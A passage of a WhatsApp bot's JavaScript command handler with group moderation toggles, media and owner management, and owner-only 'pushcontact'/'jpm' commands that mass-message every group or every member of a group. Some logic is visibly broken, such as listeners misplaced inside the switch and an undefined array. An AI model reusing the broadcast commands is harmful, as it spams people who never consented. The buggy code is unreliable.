            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{
  "title": "SELECT ENABLE/DISABLE ",
  "sections": [
    {
      "title": "CHOOSE ENABLE/DISABLE",
      "rows": [
        {
          "header": "ENABLE ",
          "title": "CHOOSE ",
          "description": "ENABLE ",
          "id": "${prefix}enable"
        },
        {
          "header": "DISABLE ",
          "title": "CHOOSE ",
          "description": "DISABLE ",
          "id": "${prefix}disable"
        }
      ]
    }
  ]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'antilocation':{
		         if (!m.isGroup) return VeranStickGroup()
if (!m.isBotAdmin) return VeranStickBotAdmin()
if (!m.isAdmin && !VeranTheCreator) return VeranStickAdmin()
               if (args[0] === 'on') {
                  db.groups[m.chat].antilocation = true
                  replygcveran(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.groups[m.chat].antilocation = false
                  replygcveran(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{
  "title": "SELECT ENABLE/DISABLE ",
  "sections": [
    {
      "title": "CHOOSE ENABLE/DISABLE",
      "rows": [
        {
          "header": "ENABLE ",
          "title": "CHOOSE ",
          "description": "ENABLE ",
          "id": "${prefix}enable"
        },
        {
          "header": "DISABLE ",
          "title": "CHOOSE ",
          "description": "DISABLE ",
          "id": "${prefix}disable"
        }
      ]
    }
  ]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'antilink': {
    if (!m.isGroup) return VeranStickGroup()
    if (!m.isBotAdmin) return VeranStickBotAdmin()

    // Check if user is an admin
    let groupMetadata = m.isGroup ? await VeranBotInc.groupMetadata(m.chat) : {}
    let isAdmin = groupMetadata.participants.find(u => u.id === m.sender)?.admin
    if (!isAdmin && !VeranTheCreator) return VeranStickAdmin()

    // Enable/Disable Anti-Link
    const lowerQ = q ? q.toLowerCase().trim() : ''
    db.groups[m.chat] = db.groups[m.chat] || {}

    if (lowerQ === 'on') {
        db.groups[m.chat].antilink = true
        replygcveran(`✅ Anti-Link has been *Enabled* in this group.`)
    } else if (lowerQ === 'off') {
        db.groups[m.chat].antilink = false
        replygcveran(`❌ Anti-Link has been *Disabled* in this group.`)
    } else {
        // Show buttons for Enable / Disable
        let buttons = [
            { buttonId: `${prefix}antilink on`, buttonText: { displayText: 'Enable Anti-Link' }, type: 1 },
            { buttonId: `${prefix}antilink off`, buttonText: { displayText: 'Disable Anti-Link' }, type: 1 }
        ]

        await VeranBotInc.sendMessage(m.chat, { 
            text: 'Please choose to enable or disable the Anti-Link system 🌐', 
            buttons: buttons, 
            footer: 'ANTI-LINK CONTROLLER', 
            headerType: 1 
        }, { quoted: m })
    }
}
break

// Listen for new messages to detect links
VeranBotInc.ev.on('messages.upsert', async (update) => {
    const messages = update.messages
    if (!messages || !Array.isArray(messages)) return

    for (let message of messages) {
        const m = message.message
        const chatId = message.key.remoteJid
        const senderId = message.key.participant || message.key.remoteJid

        // Check if Anti-Link is enabled in this group
        const isAntiLinkEnabled = db.groups[chatId]?.antilink
        if (!isAntiLinkEnabled) return

        // Check if the message contains a link
        const linkRegex = /(https?:\/\/[^\s]+)|(www\.[^\s]+)|(\.[a-z]{2,3}\/[^\s]*)/gi
        const messageText = m?.conversation || m?.extendedTextMessage?.text || ''

        if (linkRegex.test(messageText)) {
            try {
                // Delete the message
                await VeranBotInc.sendMessage(chatId, { delete: { remoteJid: chatId, fromMe: false, id: message.key.id, participant: senderId } })
                
                // Send warning to the user
                await VeranBotInc.sendMessage(chatId, { 
                    text: `🚨 *Link detected!* \n@${senderId.split('@')[0]} links are not allowed in this group. Please refrain from posting links.`, 
                    mentions: [senderId]
                })
            } catch (error) {
                console.error('Error deleting link message:', error)
            }
        }
    }
})



			case 'antibot': {
    if (!m.isGroup) return VeranStickGroup()
    if (!m.isBotAdmin) return VeranStickBotAdmin()

    // Check if user is an admin or the creator
    let groupMetadata = m.isGroup ? await VeranBotInc.groupMetadata(m.chat) : {}
    let isAdmin = groupMetadata.participants.find(u => u.id === m.sender)?.admin
    if (!isAdmin && !VeranTheCreator) return VeranStickAdmin()

    // Enable/Disable Anti-Bot feature
    const lowerQ = q ? q.toLowerCase().trim() : ''
    db.groups[m.chat] = db.groups[m.chat] || {}

    if (lowerQ === 'on') {
        db.groups[m.chat].antibot = true
        replygcveran(`✅ Anti-Bot has been *Enabled* in this group.`)
    } else if (lowerQ === 'off') {
        db.groups[m.chat].antibot = false
        replygcveran(`❌ Anti-Bot has been *Disabled* in this group.`)
    } else {
        // Show buttons for Enable / Disable
        let buttons = [
            { buttonId: `${prefix}antibot on`, buttonText: { displayText: 'Enable Anti-Bot' }, type: 1 },
            { buttonId: `${prefix}antibot off`, buttonText: { displayText: 'Disable Anti-Bot' }, type: 1 }
        ]

        await VeranBotInc.sendMessage(m.chat, { 
            text: 'Please choose to enable or disable the Anti-Bot system 🤖', 
            buttons: buttons, 
            footer: 'ANTI-BOT CONTROLLER', 
            headerType: 1 
        }, { quoted: m })
    }
}

// Listen for new messages to detect bot text messages only
VeranBotInc.ev.on('messages.upsert', async (update) => {
    const messages = update.messages
    if (!messages || !Array.isArray(messages)) return

    for (let message of messages) {
        const m = message.message
        const chatId = message.key.remoteJid
        const senderId = message.key.participant || message.key.remoteJid

        // Check if Anti-Bot is enabled in this group
        const isAntiBotEnabled = db.groups[chatId]?.antibot
        if (!isAntiBotEnabled) return

        // Check if the sender is a bot
        const isBot = message.message?.contactMessage?.isBot || senderId.endsWith('@s.whatsapp.net')

        // Check if the message is a text message only
        const isTextMessage = m?.conversation || m?.extendedTextMessage?.text

        if (isBot && isTextMessage) {
            try {
                // Delete the bot's text message
                await VeranBotInc.sendMessage(chatId, { 
                    delete: { remoteJid: chatId, fromMe: false, id: message.key.id, participant: senderId } 
                })
                
                // Optional: Send warning to the group (optional)
                await VeranBotInc.sendMessage(chatId, { 
                    text: `🚨 *Bot text message detected and deleted!*`, 
                    mentions: [senderId]
                })
            } catch (error) {
                console.error('Error deleting bot message:', error)
            }
        }
    }
})
break

			case 'pinchat': {
if (!VeranTheCreator) return VeranStickOwner()
if (m.isGroup) return VeranStickPrivate()
VeranBotInc.chatModify({ pin: true }, m.chat)
}
break
case 'unpinchat': {
if (!VeranTheCreator) return VeranStickOwner()
if (m.isGroup) return VeranStickPrivate()
VeranBotInc.chatModify({ pin: false }, m.chat)
}
break
			case 'clearchat': {
if (!VeranTheCreator) return VeranStickOwner()
VeranBotInc.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] }, m.chat)
}
break
			case 'checkmember': case 'cekmember':{
                                if (!m.isAdmin && !VeranTheCreator) return VeranStickAdmin()
                                if (!m.isGroup) return VeranStickGroup()
replygcveran(`Group: *${groupMetadata.subject}*\nTotal participants: *${participants.length}*`)
                                }
                                break
			case 'jpm': case 'post': case 'pushcontactgc': {
if (!VeranTheCreator) return VeranStickOwner()
if (!m.isGroup) return VeranStickGroup()
if (!text) return replygcveran(`*Incorrect Usage Please Use Like This*\n${prefix+command} text|pause\n\nReply Image To Send Images to All Groups\nFor a pause, 1000 = 1 second\n\nExample: ${prefix + command} hello|9000`)
await replygcveran(`In progress...`)
let getGroups = await VeranBotInc.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
for (let xnxx of anu) {
let metadat72 = await VeranBotInc.groupMetadata(xnxx)
let participanh = await metadat72.participants
if (/image/.test(mime)) {
media = await VeranBotInc.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPh(media)
await VeranBotInc.sendMessage(xnxx, { image: { url: mem }, caption: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
} else {
await VeranBotInc.sendMessage(xnxx, { text: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
}}
replygcveran(`Success`)
}
break
			case 'pushcontact': {
    if (!VeranTheCreator) return VeranStickOwner()
    if (!m.isGroup) return VeranStickGroup()
    if (!text) return replygcveran(`text?`)
    let mem = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
    replygcveran(`Success in pushing the message to contacts`)
    for (let pler of mem) {
    VeranBotInc.sendMessage(pler, { text: q})
     }  
     replygcveran(`Done`)
      }
      break
case 'pushcontactv2':{
if (!VeranTheCreator) return VeranStickOwner()
if (!q) return replygcveran(`Incorrect Usage Please Use Command Like This\n${prefix+command} idgc|text`)
try {
const metadata2 = await VeranBotInc.groupMetadata(q.split("|")[0])
const halss = metadata2.participants
for (let mem of halss) {
VeranBotInc.sendMessage(`${mem.id.split('@')[0]}` + "@s.whatsapp.net", { text: q.split("|")[1] })
await sleep(5000)
}
replygcveran(`Success`)
} catch {
	replygcveran(`Incorrect Usage Please Use Command Like This\n${prefix+command} idgc|text`)
	}
}
break
case 'pushcontactv3': {
if (!VeranTheCreator) return VeranStickOwner()
if (!m.isGroup) return VeranStickGroup()
if (!text) return replygcveran(
`
*Usage example :*

${prefix+command} pause|text

‼️Reply Image To Send Images to All Participants, For a pause, 1000 = 1 second
`
)
try {
let jedany = text.split("|")[0]
let captny = text.split("|")[1]
const halsss = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let men of halsss) {
if (/image/.test(mime)) {
media = await VeranBotInc.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPh(media)
await VeranBotInc.sendMessage(men, { image: { url: mem }, caption: captny }, { quoted: m })
await sleep(jedany)
} else {
await VeranBotInc.sendMessage(men, { text: captny  }, { quoted: m })
await sleep(jedany)
}
}
replygcveran(`Success`)
} catch {
	replygcveran(
`
*Usage example :*

${prefix+command} pause|text

‼️Reply Image To Send Images to All Participants, For a pause, 1000 = 1 second
`
)
}
}
break
			case 'autosticker': case 'autostickergc':
if (!VeranTheCreator) return VeranStickOwner()        
                if (q == 'on') {
                    db.settings[botNumber].autosticker = true
                    replygcveran(`Successfully Changed Auto Sticker To ${q}`)
                } else if (q == 'off') {
                    db.settings[botNumber].autosticker = false
                    replygcveran(`Successfully Changed Auto Sticker To ${q}`)
                } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{
  "title": "SELECT ENABLE/DISABLE ",
  "sections": [
    {
      "title": "CHOOSE ENABLE/DISABLE",
      "rows": [
        {
          "header": "ENABLE ",
          "title": "CHOOSE ",
          "description": "ENABLE ",
          "id": "${prefix}enable"
        },
        {
          "header": "DISABLE ",
          "title": "CHOOSE ",
          "description": "DISABLE ",
          "id": "${prefix}disable"
        }
      ]
    }
  ]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
			case 'addvideo':{
if (!VeranTheCreator) return VeranStickOwner()
if (args.length < 1) return replygcveran('Whats the video name?')
if (Videoveran.includes(q)) return replygcveran("The name is already in use")
let delb = await VeranBotInc.downloadAndSaveMediaMessage(quoted)
Videoveran.push(q)
await fsx.copy(delb, `./VTHmedia/video/${q}.mp4`)
fs.writeFileSync('./VTHmedia/database/vthvideo.json', JSON.stringify(Videoveran))
fs.unlinkSync(delb)
replygcveran(`Success Adding Video\nCheck by typing ${prefix}listvideo`)
}
break
case 'delvideo':{
if (!VeranTheCreator) return VeranStickOwner()
if (args.length < 1) return replygcveran('Enter the video name')
if (!Videoveran.includes(q)) return replygcveran("The name does not exist in the database")
let wanu = Videoveran.indexOf(q)
Videoveran.splice(wanu, 1)
fs.writeFileSync('./VTHmedia/database/vthvideo.json', JSON.stringify(Videoveran))
fs.unlinkSync(`./VTHmedia/video/${q}.mp4`)
replygcveran(`Success deleting video ${q}`)
}
break
case 'listvideo':{
let teks = '┌──⭓「 *Video List* 」\n│\n'
for (let x of Videoveran) {
teks += `│${setv} ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${Videoveran.length}*`
replygcveran(teks)
}
break
case 'addimage':{
if (!VeranTheCreator) return VeranStickOwner()
if (args.length < 1) return replygcveran('Whats the image name?')
if (Imageveran.includes(q)) return replygcveran("The name is already in use")
let delb = await VeranBotInc.downloadAndSaveMediaMessage(quoted)
Imageveran.push(q)
await fsx.copy(delb, `./VTHmedia/image/${q}.jpg`)
fs.writeFileSync('./VTHmedia/database/vthimage.json', JSON.stringify(Imageveran))
fs.unlinkSync(delb)
replygcveran(`Success Adding Image\nCheck by typing ${prefix}listimage`)
}
break
case 'delimage':{
if (!VeranTheCreator) return VeranStickOwner()
if (args.length < 1) return replygcveran('Enter the image name')
if (!Imageveran.includes(q)) return replygcveran("The name does not exist in the database")
let wanu = Imageveran.indexOf(q)
Imageveran.splice(wanu, 1)
fs.writeFileSync('./VTHmedia/database/vthimage.json', JSON.stringify(Imageveran))
fs.unlinkSync(`./VTHmedia/image/${q}.jpg`)
replygcveran(`Success deleting image ${q}`)
}
break
case 'listimage':{
let teks = '┌──⭓「 *Image List* 」\n│\n'
for (let x of Imageveran) {
teks += `│${setv} ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${Imageveran.length}*`
replygcveran(teks)
}
break
case 'addsticker':{
if (!VeranTheCreator) return VeranStickOwner()
if (args.length < 1) return replygcveran('Whats the sticker name?')
if (Stickerveran.includes(q)) return replygcveran("The name is already in use")
let delb = await VeranBotInc.downloadAndSaveMediaMessage(quoted)
Stickerveran.push(q)
await fsx.copy(delb, `./VTHmedia/sticker/${q}.webp`)
fs.writeFileSync('./VTHmedia/database/vthsticker.json', JSON.stringify(Stickerveran))
fs.unlinkSync(delb)
replygcveran(`Success Adding Sticker\nCheck by typing ${prefix}liststicker`)
}
break
case 'delsticker':{
if (!VeranTheCreator) return VeranStickOwner()
if (args.length < 1) return replygcveran('Enter the sticker name')
if (!Stickerveran.includes(q)) return replygcveran("The name does not exist in the database")
let wanu = Stickerveran.indexOf(q)
Stickerveran.splice(wanu, 1)
fs.writeFileSync('./VTHmedia/database/vthsticker.json', JSON.stringify(Stickerveran))
fs.unlinkSync(`./VTHmedia/sticker/${q}.webp`)
replygcveran(`Success deleting sticker ${q}`)
}
break
case 'liststicker':{
let teks = '┌──⭓「 *Sticker List* 」\n│\n'
for (let x of Stickerveran) {
teks += `│${setv} ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${Stickerveran.length}*`
replygcveran(teks)
}
break
case 'addvn':{
if (!VeranTheCreator) return VeranStickOwner()
if (args.length < 1) return replygcveran('Whats the audio name?')
if (VoiceNoteveran.includes(q)) return replygcveran("The name is already in use")
let delb = await VeranBotInc.downloadAndSaveMediaMessage(quoted)
VoiceNoteveran.push(q)
await fsx.copy(delb, `./VTHmedia/audio/${q}.mp3`)
fs.writeFileSync('./VTHmedia/database/vthvn.json', JSON.stringify(VoiceNoteveran))
fs.unlinkSync(delb)
replygcveran(`Success Adding Audio\nCheck by typing ${prefix}listvn`)
}
break
case 'delvn':{
if (!VeranTheCreator) return VeranStickOwner()
if (args.length < 1) return replygcveran('Enter the vn name')
if (!VoiceNoteveran.includes(q)) return replygcveran("The name does not exist in the database")
let wanu = VoiceNoteveran.indexOf(q)
VoiceNoteveran.splice(wanu, 1)
fs.writeFileSync('./VTHmedia/database/n.json', JSON.stringify(VoiceNoteveran))
fs.unlinkSync(`./VTHmedia/audio/${q}.mp3`)
replygcveran(`Success deleting vn ${q}`)
}
break
case 'listvn':{
let teks = '┌──⭓「 *VN List* 」\n│\n'
for (let x of VoiceNoteveran) {
teks += `│${setv} ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${VoiceNoteveran.length}*`
replygcveran(teks)
}
break
case 'addzip':{
if (!VeranTheCreator) return VeranStickOwner()

if (args.length < 1) return replygcveran(`What's the zip name?`)
let teks = `${text}`
{
if (Zipveran.includes(teks)) return replygcveran("This name is already in use")
let delb = await VeranBotInc.downloadAndSaveMediaMessage(quoted)
Zipveran.push(teks)
await fsx.copy(delb, `./VTHmedia/zip/${teks}.zip`)
fs.writeFileSync('./VTHmedia/database/zip.json', JSON.stringify(Zipveran))
fs.unlinkSync(delb)
replygcveran(`Success Adding zip\nTo check type ${prefix}listzip`)
}
}
break
case 'delzip':{
if (!VeranTheCreator) return VeranStickOwner()

if (args.length < 1) return replygcveran('Enter the text in the zip list')
let teks = `${text}`
{
if (!Zipveran.includes(teks)) return replygcveran("This name does not exist in the database")
let wanu = Zipveran.indexOf(teks)
Zipveran.splice(wanu, 1)
fs.writeFileSync('./VTHmedia/database/zip.json', JSON.stringify(Zipveran))
fs.unlinkSync(`./VTHmedia/zip/${teks}.zip`)
replygcveran(`Successfully deleted zip ${teks}`)
}
}
break
case 'listzip': {

let teksooooo = '┌──⭓「 *ZIP LIST* 」\n│\n'
for (let x of Zipveran) {
teksooooo += `│${setv} ${x}\n`
}
teksooooo += `│\n└────────────⭓\n\n*Total : ${Zipveran.length}*`
replygcveran(teksooooo)
}
break
case 'addapk':{
if (!VeranTheCreator) return VeranStickOwner()

if (args.length < 1) return replygcveran('What is the name of the apk?')
let teks = `${text}`
{
if (Apkveran.includes(teks)) return replygcveran("This name is already in use")
let delb = await VeranBotInc.downloadAndSaveMediaMessage(quoted)
apknye.push(teks)
await fsx.copy(delb, `./VTHmedia/apk/${teks}.apk`)
fs.writeFileSync('./VTHmedia/database/apk.json', JSON.stringify(Apkveran))
fs.unlinkSync(delb)
replygcveran(`Successful Adding apk\nTo Check type ${prefix}listapk`)
}
}
break
case 'delapk':{
if (!VeranTheCreator) return VeranStickOwner()

if (args.length < 1) return replygcveran('Name of the apk?')
let teks = `${text}`
{
if (!Apkveran.includes(teks)) return replygcveran("This name does not exist in the database")
let wanu = Apkveran.indexOf(teks)
Apkveran.splice(wanu, 1)
fs.writeFileSync('./VTHmedia/database/apk.json', JSON.stringify(Apkveran))
fs.unlinkSync(`./VTHmedia/apk/${teks}.apk`)
replygcveran(`Successfully deleted Apk ${teks}`)
}
}
break
case 'listapk': {

let teksoooooo = '┌──⭓「 *APK LIST* 」\n│\n'
for (let x of Apkveran) {
teksoooooo += `│${setv} ${x}\n`
}
teksoooooo += `│\n└────────────⭓\n\n*Total : ${Apkveran.length}`
replygcveran(teksoooooo)
}
break
case 'addpdf':{
if (!VeranTheCreator) return VeranStickOwner()

if (args.length < 1) return replygcveran('What is the name of the pdf')
let teks = `${text}`
{
if (Docveran.includes(teks)) return replygcveran("This name is already in use")
let delb = await VeranBotInc.downloadAndSaveMediaMessage(quoted)
Docveran.push(teks)
await fsx.copy(delb, `./VTHmedia/doc/${teks}.pdf`)
fs.writeFileSync('./VTHmedia/database/doc.json', JSON.stringify(Docveran))
fs.unlinkSync(delb)
replygcveran(`Successful Adding Pdf\nTo check type ${prefix}listpdf`)
}
}
break
case 'delpdf':{
if (!VeranTheCreator) return VeranStickOwner()

if (args.length < 1) return replygcveran('Enter the name')
let teks = `${text}`
{
if (!Docveran.includes(teks)) return replygcveran("This name does not exist in the database")
let wanu = Docveran.indexOf(teks)
Docveran.splice(wanu, 1)
fs.writeFileSync('./VTHmedia/database/doc.json', JSON.stringify(Docveran))
fs.unlinkSync(`./VTHmedia/doc/${teks}.pdf`)
replygcveran(`Successfully deleted pdf ${teks}`)
}
}
break
case 'listpdf': {

let teksoooo = '┌──⭓「 *PDF LIST* 」\n│\n'
for (let x of Docveran) {
teksoooo += `│${setv} ${x}\n`
}
teksoooo += `│\n└────────────⭓\n\n*Total : ${Docveran.length}*`
replygcveran(teksoooo)
}
break
			case 'addmsg': {
				if (!VeranTheCreator) return VeranStickOwner()
				if (!m.quoted) return replygcveran('Reply to messages you want to save in the database')
				if (!text) return replygcveran(`Example : ${prefix + command} file name`)
				let msgs = global.db.database
				if (text.toLowerCase() in msgs) return replygcveran(`'${text}' has been registered in the message list`)
				msgs[text.toLowerCase()] = m.quoted
				delete msgs[text.toLowerCase()].chat
				replygcveran(`Successfully added the message to the message list as '${text}'\nAccess with ${prefix}getmsg ${text}\nView the Message With ${prefix}listmsg`)
			}
			break
			case 'delmsg': case 'deletemsg': {
				if (!VeranTheCreator) return VeranStickOwner()
				if (!text) return replygcveran('The name of the message you want to delete?')
				let msgs = global.db.database
				if (text == 'allmsg') {
					global.db.database = {}
					replygcveran('Successfully deleted all msgs from the message list')
				} else {
					if (!(text.toLowerCase() in msgs)) return replygcveran(`'${text}' not listed in the message list`)
					delete msgs[text.toLowerCase()]
					replygcveran(`Successfully deleted '${text}' from the message list`)
				}
			}
			break
			case 'getmsg': {
				if (!text) return replygcveran(`Example : ${prefix + command} file name\n\nView the list of messages with ${prefix}listmsg`)
				let msgs = global.db.database
				if (!(text.toLowerCase() in msgs)) return replygcveran(`'${text}' not listed in the message list`)
				await VeranBotInc.relayMessage(m.chat, msgs[text.toLowerCase()], {})
			}
			break
			case 'listmsg': {
				let seplit = Object.entries(global.db.database).map(([nama, isi]) => { return { nama, ...isi } })
				let teks = '「 LIST DATABASE 」\n\n'
				for (let i of seplit) {
					teks += `${setv} *Name :* ${i.nama}\n${setv} *Type :* ${getContentType(i.message)?.replace(/Message/i, '')}\n────────────────────────\n\n`
				}
				replygcveran(teks)
			}
			break
			case 'addowner':
if (!VeranTheCreator) return VeranStickOwner()
if (!args[0]) return replygcveran(`Use ${prefix+command} number\nExample ${prefix+command} ${ownernumber}`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await VeranBotInc.onWhatsApp(bnnd)
if (ceknye.length == 0) return replygcveran(`Enter A Valid And Registered Number On WhatsApp!!!`)
owner.push(bnnd)
fs.writeFileSync('./src/owner.json', JSON.stringify(owner))
replygcveran(`Number ${bnnd} Has Become An Owner!!!`)
break
case 'delowner':
if (!VeranTheCreator) return VeranStickOwner()
if (!args[0]) return replygcveran(`Use ${prefix+command} number\nExample ${prefix+command} 2347082664317`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./src/owner.json', JSON.stringify(owner))
replygcveran(`The Numbrr ${ya} Has been deleted from owner list by the owner!!!`)
break
case 'listowner': {
                let teks = '┌──⭓「 *List Owner* 」\n│\n'
                for (let x of owner) {
                    teks += `│${setv} ${x}\n`
                }
                teks += `│\n└────────────⭓\n\n*Total : ${owner.length}*`
                replygcveran(teks)
            }
            break
			case 'shutdown': case 'restart': case 'reboot':{
                if (!VeranTheCreator) return VeranStickOwner()
                replygcveran(`Restarting will be completed in seconds`)
                await sleep(3000)
                process.exit()
                }
            break
			  case 'userjid':
  case 'jid':
  case 'groupjid':
            case 'id':{
            replygcveran(m.chat)
           }
          break


          case 'banchat': {
            if (!VeranTheCreator) {
              if (m.isGroup) {
                const groupId = m.chat;
                
                // Load the list of banned groups from the JSON file
                let bannedGroups = require('./database/jid.json');
                
                // Check if the group is already banned
                if (!bannedGroups.includes(groupId)) {
                  // Add the group ID to the list of banned groups
                  bannedGroups.push(groupId);
                  
                  // Save the updated list to the JSON file
                  const fs = require('fs');
                  fs.writeFileSync('./database/jid.json', JSON.stringify(bannedGroups, null, 2));
                  
                  // Notify the group that it has been banned
                  replygcveran(`This chat has been banned for using the bot.`);
                  
                  // Leave the group
                  await VeranBotInc.groupLeave(groupId);
                } else {
                  replygcveran(`This chat is already banned.`);
                }
                
              } else {
                replygcveran(`This command can only be used in a group chat.`);
              }
            }
          }
          break;
          
           



			case 'getexif': case 'getwm': case 'getwatermark':{
                if (!VeranTheCreator) return VeranStickOwner()
               replygcveran(`*Water Mark/Exif of ${botname} is*\n\n${setv} Packname : ${packname}\n${setv} Author : ${author}`)
               }
                break
                case 'getautoblocknumber': case 'getautoblockno': case 'getautoblock':{
                if (!VeranTheCreator) return VeranStickOwner()
               replygcveran(`*Auto Block Country Code of ${botname} is*\n\n${setv} Country Code : ${autoblocknumber}\n\n_Note: Once autoblock number is activated, numbers related to this country code will be blocked automatcially_`)
               }
                break
                case 'getantiforeign': case 'getantiforeignno': case 'getantiforeignnumber':{
                if (!VeranTheCreator) return VeranStickOwner()
               replygcveran(`*Anti Foreign Country Code of ${botname} is*\n\n${setv} Country Code : ${antiforeignnumber}\n\n_Note: Once antiforeign number is activated in any group chat, only members related to this country code are allowed to stay in the group chat, others will be kicked immediately, if chatted._`)
               }
                break
			case 'setexif':
            case 'setwm':{
                if (!VeranTheCreator) return VeranStickOwner()
                if (!text) return replygcveran(`Example : ${prefix + command} packname|author`)
                global.packname = text.split("|")[0]
                global.author = text.split("|")[1]
                replygcveran(`Exif successfully changed to\n\n• Packname : ${global.packname}\n• Author : ${global.author}`)
                }
                break
			    case 'creategc': case 'creategroup': {
if (!VeranTheCreator) return VeranStickOwner()
if (!args.join(" ")) return replygcveran(`Use ${prefix+command} groupname`)
try {
let cret = await VeranBotInc.groupCreate(args.join(" "), [])
let response = await VeranBotInc.groupInviteCode(cret.id)
const teksop = `     「 Create Group 」

▸ Name : ${cret.subject}
▸ Owner : @${cret.owner.split("@")[0]}
▸ Creation : ${moment(cret.creation * 1000).tz("Asia/Karachi").format("DD/MM/YYYY HH:mm:ss")}

https://chat.whatsapp.com/${response}`
VeranBotInc.sendMessage(m.chat, { text:teksop, mentions: await VeranBotInc.parseMention(teksop)}, {quoted:m})
} catch {
	replygcveran(`Error`)
	}
}
break
			case 'resetuser':
            case 'resetdbuser': {
               if (!VeranTheCreator) return VeranStickOwner()
               let totalusernya = db.users[0]
               replygcveran(`Succesfully Deleted ${totalusernya} Users in Database`)
               db.users = []
            }
            break
			case 'resethit':
            case 'resettotalhit': {
               if (!VeranTheCreator) return VeranStickOwner()
               global.db.settings[botNumber].totalhit = 0
               replygcveran(mess.done)
            }
            break
			case 'setreply':{
               if (!VeranTheCreator) return VeranStickOwner()
               if (text.startsWith('v')) {
                  typereply = text
                  replygcveran(mess.done)
               } else {
                  let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT REPLY 🐛",
